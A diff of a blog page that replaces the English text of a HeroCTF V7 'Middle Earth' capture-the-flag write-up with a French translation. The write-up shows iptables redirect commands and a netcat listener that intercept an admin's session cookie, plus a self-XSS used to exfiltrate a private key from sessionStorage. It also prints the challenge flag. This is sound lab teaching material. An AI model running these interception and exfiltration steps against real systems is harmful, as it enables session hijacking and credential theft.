@@ -5,9 +5,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="icon" type="image/png" href="/favicon.png">
-    <title>HeroCTF V7 - Middle Earth [EN] - Trachinus Blog</title>
-    <link rel="stylesheet" href="/static/style.css?v=1771611867.755306">
-    <link rel="stylesheet" href="/static/syntax.css?v=1771611867.755306">
+    <title>HeroCTF V7 - Middle Earth [FR] - Trachinus Blog</title>
+    <link rel="stylesheet" href="/static/style.css?v=1771611867.745584">
+    <link rel="stylesheet" href="/static/syntax.css?v=1771611867.745584">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link
@@ -69,14 +69,14 @@
             
             <div class="lang-switcher">
                 <a href="/heroctfv7/middle_earth.html"
-                    class="lang-code active">EN</a>
+                    class="lang-code ">EN</a>
                 <span class="lang-separator">|</span>
                 <a href="/heroctfv7/middle_earth_fr.html"
-                    class="lang-code ">FR</a>
+                    class="lang-code active">FR</a>
             </div>
             
         </div>
-        <h1 class="post-title-large">HeroCTF V7 - Middle Earth [EN]</h1>
+        <h1 class="post-title-large">HeroCTF V7 - Middle Earth [FR]</h1>
         <div class="post-meta-large">
             2025-12-02
             
@@ -84,14 +84,14 @@
     </header>
 
     <div class="markdown-body">
-        <p>This challenge was a joint solve between <a href="https://lucashanson.fr">siefr3dus</a> and I.</p>
-<p>It was mainly a system challenge, but also contained an important web application.</p>
+        <p>Ce challenge a été résolu conjointement par <a href="https://lucashanson.fr">siefr3dus</a> et moi-même.</p>
+<p>Il s'agissait principalement d'un challenge système, mais il comportait également une part importante liée à une application web.</p>
 <p><img alt="" src="/static/img/system_chall_netowrk_chall.jpg" title="600px" /></p>
 <h2 id="reconnaissance">Reconnaissance</h2>
-<p>We were given the credentials <strong>aragorn:hobbit</strong>, which we could use for both the web application and the SSH connection to the machine.</p>
-<p>We were also told that the admin user <strong>Saruman</strong> would login often using his administrator account.</p>
-<p>The webapp allows us to receive encrypted messages, which we can then decrypt using our private key.</p>
-<p>Contained in the login page is a small code block that generates our public/private key pair. </p>
+<p>On nous a fourni les identifiants <strong>aragorn:hobbit</strong>, que nous pouvions utiliser à la fois pour l'application web et pour la connexion SSH à la machine.</p>
+<p>On nous a également informés que l'utilisateur admin <strong>Saruman</strong> se connectait souvent avec son compte administrateur.</p>
+<p>L'application web nous permet de recevoir des messages chiffrés, que nous pouvons ensuite déchiffrer à l'aide de notre clé privée.</p>
+<p>La page de connexion contient un petit bloc de code qui génère notre paire de clés publique/privée.</p>
 <div class="codehilite"><pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">crypt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">JSEncrypt</span><span class="p">({</span><span class="w"> </span><span class="nx">default_key_size</span><span class="o">:</span><span class="w"> </span><span class="mf">2048</span><span class="w"> </span><span class="p">});</span>
 <span class="kd">const</span><span class="w"> </span><span class="nx">privateKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">crypt</span><span class="p">.</span><span class="nx">getPrivateKey</span><span class="p">();</span>
 <span class="kd">const</span><span class="w"> </span><span class="nx">publicKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">crypt</span><span class="p">.</span><span class="nx">getPublicKey</span><span class="p">();</span>
@@ -100,15 +100,15 @@
 <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;publicKey&#39;</span><span class="p">).</span><span class="nx">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">publicKey</span><span class="p">;</span>
 </code></pre></div>
 
-<p>When we log in, our private key is stored in the sessionStorage, whilst the public key is sent as a POST parameter:</p>
+<p>Lorsque nous nous connectons, notre clé privée est stockée dans le <code>sessionStorage</code>, tandis que la clé publique est envoyée en tant que paramètre POST :</p>
 <div class="codehilite"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/login</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
 <span class="na">Host</span><span class="o">:</span> <span class="l">dyn01.heroctf.fr:11267</span>
 <span class="err">...</span>
 username=aragorn&amp;password=hobbit&amp;publicKey=-----BEGIN+PUBLIC+KEY-----...-----END+PUBLIC+KEY-----
 </code></pre></div>
 
-<p>The public key is then reflected in the inbox page, whilst also being stored in the user session:</p>
-<p>We can then request a new message, and decrypt it client side using the JSEncrypt library:</p>
+<p>La clé publique est ensuite reflétée sur la page de boîte de réception, tout en étant également stockée dans la session utilisateur :</p>
+<p>Nous pouvons alors demander un nouveau message et le déchiffrer côté client à l'aide de la bibliothèque JSEncrypt :</p>
 <div class="codehilite"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/request_encrypted</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
 <span class="na">Host</span><span class="o">:</span> <span class="l">dyn01.heroctf.fr:11267</span>
 <span class="err">...</span>
@@ -118,9 +118,9 @@ Cookie: session=.eJwlzjsOwjAMANC7eGaIk9iOe5kq8UdlbemEuDtIvBO8N-x5xnXA9jrveMD-dNi
 {&quot;flag&quot;:false}
 </code></pre></div>
 
-<p>Take into account here that the flag can only be requested when we have an admin account, which is currently not the case.</p>
+<p>Prenez en compte ici que le flag ne peut être demandé que si nous possédons un compte administrateur, ce qui n'est pas le cas pour l'instant.</p>
 <h2 id="exploitation">Exploitation</h2>
-<p>After doing some quick recon on the server, we stumble across an iptables wrapper file that can be executed as root.</p>
+<p>Après une rapide reconnaissance sur le serveur, nous tombons sur un script wrapper pour iptables qui peut être exécuté en tant que root.</p>
 <div class="codehilite"><pre><span></span><code>aragorn@middle_earth:~$<span class="w"> </span>cat<span class="w"> </span>/opt/w_iptables.sh<span class="w"> </span>
 <span class="c1">#!/bin/bash</span>
 
@@ -152,18 +152,18 @@ Cookie: session=.eJwlzjsOwjAMANC7eGaIk9iOe5kq8UdlbemEuDtIvBO8N-x5xnXA9jrveMD-dNi
 <span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Rule added successfully: /usr/sbin/iptables -</span><span class="nv">$APPEND_OR_DELETE</span><span class="s2">  </span><span class="nv">$CHAIN</span><span class="s2"> -p </span><span class="nv">$PROTOCOL</span><span class="s2"> --dport </span><span class="nv">$PORT_SRC</span><span class="s2"> -j </span><span class="nv">$ACTION</span><span class="s2">&quot;</span>
 </code></pre></div>
 
-<p>This script basically allows us to add and remove iptables rules, including <strong>NAT REDIRECT</strong> (which will be very useful), as long as the chosen ports are within the allowed range (1-2000).</p>
-<p>Thus, the fact that we can modify iptables rules, as well as the fact that the admin user regularly uses the webapp, will allow us to act as a proxy and intercept the traffic between the admin and the backend.</p>
-<h3 id="intercepting-the-cookie">Intercepting the Cookie</h3>
-<p>We need two things to be able to obtain the flag, a valid admin session cookie, as well as the admin's private key.</p>
-<p>Lets start with the cookie; its as simple as intercepting a POST request from the admin to the backend.</p>
+<p>Ce script nous permet essentiellement d'ajouter et de supprimer des règles iptables, y compris un <strong>NAT REDIRECT</strong> (ce qui sera très utile), tant que les ports choisis sont dans la plage autorisée (1-2000).</p>
+<p>Ainsi, le fait de pouvoir modifier les règles iptables, combiné au fait que l'administrateur utilise régulièrement l'application web, va nous permettre d'agir comme un proxy et d'intercepter le trafic entre l'administrateur et le backend.</p>
+<h3 id="interception-du-cookie">Interception du Cookie</h3>
+<p>Nous avons besoin de deux choses pour pouvoir obtenir le flag : un cookie de session admin valide, ainsi que la clé privée de l'admin.</p>
+<p>Commençons par le cookie ; c'est aussi simple que d'intercepter une requête POST de l'admin vers le backend.</p>
 <p><img alt="" src="/static/img/client_request_you_shall_not_pass.jpg" /></p>
-<p>First, we need to add 2 iptables rules that will redirect traffic from the original web application port (80), to a port we control:</p>
+<p>Tout d'abord, nous devons ajouter 2 règles iptables qui redirigeront le trafic du port d'origine de l'application web (80) vers un port que nous contrôlons :</p>
 <div class="codehilite"><pre><span></span><code>sudo<span class="w"> </span>/opt/w_iptables.sh<span class="w"> </span>A<span class="w"> </span>PREROUTING<span class="w"> </span>tcp<span class="w"> </span><span class="m">80</span><span class="w"> </span><span class="m">1337</span><span class="w"> </span>REDIRECT
 sudo<span class="w"> </span>/opt/w_iptables.sh<span class="w"> </span>A<span class="w"> </span>OUTPUT<span class="w"> </span>tcp<span class="w"> </span><span class="m">80</span><span class="w"> </span><span class="m">1337</span><span class="w"> </span>REDIRECT
 </code></pre></div>
 
-<p>Then, we simply need to start a netcat on port 1337, and wait:</p>
+<p>Ensuite, il nous suffit de lancer un netcat sur le port 1337 et d'attendre :</p>
 <div class="codehilite"><pre><span></span><code>nc<span class="w"> </span>-lnvkp<span class="w"> </span><span class="m">1337</span>
 
 POST<span class="w"> </span>/request_encrypted<span class="w"> </span>HTTP/1.1
@@ -174,13 +174,13 @@ Cookie:<span class="w"> </span><span class="nv">session</span><span class="o">=<
 <span class="o">{</span><span class="s2">&quot;flag&quot;</span>:true<span class="o">}</span>
 </code></pre></div>
 
-<p>Now we need to revert the iptables rules that we just changed to make sure that the webapp works as it should:</p>
+<p>Maintenant, nous devons annuler les règles iptables que nous venons d'ajouter pour nous assurer que l'application web fonctionne correctement :</p>
 <div class="codehilite"><pre><span></span><code>sudo<span class="w"> </span>/opt/w_iptables.sh<span class="w"> </span>D<span class="w"> </span>PREROUTING<span class="w"> </span>tcp<span class="w"> </span><span class="m">80</span><span class="w"> </span><span class="m">1337</span><span class="w"> </span>REDIRECT
 sudo<span class="w"> </span>/opt/w_iptables.sh<span class="w"> </span>D<span class="w"> </span>OUTPUT<span class="w">     </span>tcp<span class="w"> </span><span class="m">80</span><span class="w"> </span><span class="m">1337</span><span class="w"> </span>REDIRECT
 </code></pre></div>
 
-<h3 id="exfiltrating-the-private-key">Exfiltrating the Private Key</h3>
-<p>Next up is the admin's private key, which is slightly more complicated. One thing we noticed whilst auditing the webapp, was that a self XSS was possible via this function:</p>
+<h3 id="exfiltration-de-la-cle-privee">Exfiltration de la Clé Privée</h3>
+<p>Vient ensuite la clé privée de l'admin, ce qui est un peu plus compliqué. Une chose que nous avons remarquée lors de l'audit de l'application web, c'est qu'une vulnérabilité self-XSS était possible via cette fonction :</p>
 <div class="codehilite"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">displayMsg</span><span class="p">(</span><span class="nx">content</span><span class="p">,</span><span class="w"> </span><span class="nx">encrypted</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
 <span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">inbox</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;inbox&#39;</span><span class="p">);</span>
 <span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">inbox</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">&#39;p.text-gray-500&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
@@ -210,9 +210,9 @@ sudo<span class="w"> </span>/opt/w_iptables.sh<span class="w"> </span>D<span cla
 <span class="p">}</span>
 </code></pre></div>
 
-<p>This function takes the encrypted message content and directly inserts it into the page’s HTML. This means that if we send a crafted response using our previous MitM, we can trigger the XSS on the admin's page, and exfiltrate its sessionStorage.</p>
-<p>We created a simple script that would intercept the admin's request, craft a malicious response, and exfiltrate the sessionStorage.</p>
-<p>We need to set our iptables rule first, before executing the python script:</p>
+<p>Cette fonction prend le contenu du message chiffré et l'insère directement dans le code HTML de la page. Cela signifie que si nous envoyons une réponse falsifiée en utilisant notre attaque MitM précédente, nous pouvons déclencher la XSS sur la page de l'admin, et exfiltrer son <code>sessionStorage</code>.</p>
+<p>Nous avons créé un script simple qui va intercepter la requête de l'admin, forger une réponse malveillante, et exfiltrer le <code>sessionStorage</code>.</p>
+<p>Nous devons d'abord configurer notre règle iptables avant d'exécuter le script Python :</p>
 <div class="codehilite"><pre><span></span><code>sudo<span class="w"> </span>/opt/w_iptables.sh<span class="w"> </span>A<span class="w"> </span>PREROUTING<span class="w"> </span>tcp<span class="w"> </span><span class="m">80</span><span class="w"> </span><span class="m">1337</span><span class="w"> </span>REDIRECT
 </code></pre></div>
 
@@ -307,12 +307,12 @@ sudo<span class="w"> </span>/opt/w_iptables.sh<span class="w"> </span>D<span cla
 </code></pre></div>
 
 <h2 id="flag">Flag</h2>
-<p>And there we go, the admin's private key:</p>
-<p><strong>-----BEGIN RSA PRIVATE KEY-----shortenend here for readability-----END RSA PRIVATE KEY-----</strong></p>
+<p>Et voilà, la clé privée de l'admin :</p>
+<p><strong>-----BEGIN RSA PRIVATE KEY-----raccourci ici pour des raisons de lisibilité-----END RSA PRIVATE KEY-----</strong></p>
 <p><img alt="" src="/static/img/precious_session_storage.jpeg" title="600px" /></p>
-<p>We simply need to replace our current private key with the one we just exfiltrated, replace our session cookie with the admin's, request our FLAG, and finally decrypt it!</p>
+<p>Il nous suffit alors de remplacer notre clé privée actuelle par celle que nous venons d'exfiltrer, de remplacer notre cookie de session par celui de l'admin, de demander notre FLAG, et enfin de le déchiffrer !</p>
 <p><strong>Hero{why_n0_http5_?_dbf81c4c9f3cb1b0ae72ad23c019fdce}</strong></p>
-<p>Thanks to Log_s for this super cool "system" challenge.</p>
+<p>Merci à Log_s pour ce challenge "système" très sympa.</p>
     </div>
 </article>
 
